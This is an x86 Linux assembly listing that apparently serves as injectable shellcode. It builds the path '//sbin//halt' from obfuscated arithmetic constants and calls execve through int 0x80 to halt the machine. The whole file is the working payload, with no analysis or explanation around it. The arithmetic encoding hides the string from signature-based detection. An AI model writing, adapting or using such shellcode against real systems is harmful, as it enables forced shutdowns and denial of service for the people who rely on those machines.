
global _start
section .text
_start:


xor eax,eax
push eax

;push dword 0x746c6168
mov esi,    0x524a4056
add esi,    0x22222112
mov dword [esp-4], esi

;push dword 0x2f2f6e69
mov esi,    0x1e1e5d58
add esi,    0x11111111
mov dword [esp-8], esi

;push dword 0x62732f2f
mov esi,    0x52622e2e
add esi,    0x10110101
mov dword [esp-12], esi

sub esp, 12

mov ebx,esp
push eax
mov edx,esp
push ebx
mov ecx,esp
mov al,0xb
int 0x80
